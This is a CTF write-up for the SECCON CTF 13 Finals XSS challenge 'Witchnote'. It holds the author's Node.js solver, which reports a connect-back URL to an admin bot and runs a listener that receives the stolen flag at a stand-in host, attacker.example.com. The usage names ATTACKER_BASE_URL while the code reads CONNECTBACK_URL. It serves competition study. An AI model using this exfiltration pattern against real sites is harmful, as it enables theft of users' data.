---
title: "Witchnote - SECCON CTF 13 Finals 2025"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "xss", "witchnote", "web", "seccon-ctf-13-finals"]
summary: "The trusted magic prevents XSS attacks 🧙‍♀️"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/web/witchnote"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Finals"
  year: 2025
  challenge: "Witchnote"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/web/witchnote>
- **CTF:** SECCON CTF 13 Finals 2025

---

# [web] witchnote

## Description

The trusted magic prevents XSS attacks 🧙‍♀️

- Challenge: `http://witchnote.{int,dom}.seccon.games:3000`
- Admin bot: `http://witchnote.{int,dom}.seccon.games:1337`

## Attachments

- [witchnote](distfiles)

## Usage

Launch a challenge server:

```sh
cd build
docker compose up
```

Run the author's solver:
```sh
docker run -it --rm \
    -e SECCON_HOST=localhost \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/web/witchnote/solver/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs/promises";

const BOT_BASE_URL = `http://${process.env.SECCON_HOST ?? "localhost"}:1337`;
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  const html = await fs.readFile("index.html");
  reply.type("text/html; charset=utf-8").send(html);
});

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(
    `${CONNECTBACK_URL}?${new URLSearchParams({
      baseUrl: "http://web:3000",
    })}`
  );

  await sleep(5 * 1000);
  assert.fail("Failed");
});
```
